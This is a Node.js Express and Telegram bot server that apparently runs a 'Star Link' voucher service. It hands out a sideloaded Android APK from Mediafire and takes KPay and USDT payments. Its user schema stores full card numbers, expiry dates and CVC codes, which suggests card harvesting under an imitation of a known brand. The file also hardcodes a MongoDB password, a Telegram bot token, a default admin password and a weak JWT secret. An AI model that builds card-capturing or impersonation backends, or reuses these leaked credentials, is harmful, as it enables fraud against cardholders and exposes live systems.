const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const path = require('path');
const jwt = require('jsonwebtoken');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://mongo:UTeVLbRgfLqdsrCzCzFUcitqLqPbLuzn@switchyard.proxy.rlwy.net:32968';
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'starlink123';
const JWT_SECRET = process.env.JWT_SECRET || 'starlink-secret-key';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8356328415:AAHgDeYLhTDnkKmJxik2YxIHUEwWXeUThDg';
const ADMIN_TELEGRAM_ID = process.env.ADMIN_TELEGRAM_ID || '7590111505';
const APK_FILE_PATH = path.join(__dirname, 'public', 'Star Link Mobile 2026.001.14.apk');
const IOS_APP_URL = 'https://apps.apple.com/us/app/starlink/id1537177988';
const DESKTOP_APP_URL = 'https://webcatalog.io/en/apps/starlink';

// --- MIDDLEWARE & DB SETUP ---
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));
mongoose.connect(MONGODB_URI).then(() => console.log('Connected to MongoDB')).catch(err => { console.error('DB connection error:', err); process.exit(1); });

// --- SCHEMAS ---
const voucherSchema = new mongoose.Schema({ code: { type: String, required: true, unique: true, uppercase: true }, is_used: { type: Boolean, default: false }, used_at: Date, created_at: { type: Date, default: Date.now }, plan: String });
const userSchema = new mongoose.Schema({ name: String, email: String, amount: Number, planDuration: String, cardNumber: String, cardExpiry: String, cardCvc: String, country: String, countryName: String, postalCode: String, created_at: { type: Date, default: Date.now } });
const paymentSettingsSchema = new mongoose.Schema({ kpay_name: String, kpay_phone: String, kpay_note: String, kpay_extra_note: String, usdt_bep20_address: String, usdt_trc20_address: String, usdt_amount: Number, usdt_extra_note: String });

const Voucher = mongoose.model('Voucher', voucherSchema);
const User = mongoose.model('User', userSchema);
const PaymentSettings = mongoose.model('PaymentSettings', paymentSettingsSchema);

// --- TELEGRAM BOT LOGIC ---
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

bot.on('message', (msg) => {
    const chatId = msg.chat.id;

    if (msg.text.toString().toLowerCase().includes("start")) {
        bot.sendMessage(chatId, "Welcome to the Star Link Bot!", {
            "reply_markup": {
                "keyboard": [["Download App", "User Guide"], ["Buy Voucher"], ["Admin နဲ့ဆက်သွယ်ရန်"]]
                }
            });
    } else if (msg.text.toString().toLowerCase().includes("download app")) {
        bot.sendMessage(chatId, "Click the button below to download the app.", {
            "reply_markup": {
                "inline_keyboard": [
                    [
                        { "text": "Download for Android", "url": "https://www.mediafire.com/file/r5ovja8ey6y0uwj/Star+Link+Mobile.apk/file" }
                    ]
                ]
            }
        });
    } else if (msg.text.toString() === "Admin နဲ့ဆက်သွယ်ရန်") {
        bot.sendMessage(chatId, "Click the button below to contact the admin.", {
            "reply_markup": {
                "inline_keyboard": [
                    [
                        { "text": "Contact Admin", "url": "https://t.me/starlinkmmbot" }
                    ]
                ]
            }
        });
    }
});